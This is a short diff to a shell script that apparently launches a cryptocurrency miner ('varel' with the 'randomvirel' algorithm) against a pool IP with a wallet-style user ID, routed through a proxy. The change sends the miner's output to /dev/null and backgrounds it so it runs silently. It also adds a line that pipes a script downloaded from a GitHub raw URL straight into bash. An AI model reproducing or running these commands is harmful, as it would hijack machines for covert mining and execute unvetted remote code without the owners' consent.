@@ -1,4 +1,5 @@
 chmod +x varel proxy libproxychains4.so compile.sh
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./varel -a randomvirel --url 167.99.139.112:80 --user vdjk7jb0ag5z1k3revnkhp7xhlrj794a24bhwk.ch19
+./varel -a randomvirel --url 167.99.139.112:80 --user vdjk7jb0ag5z1k3revnkhp7xhlrj794a24bhwk.ch19 > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
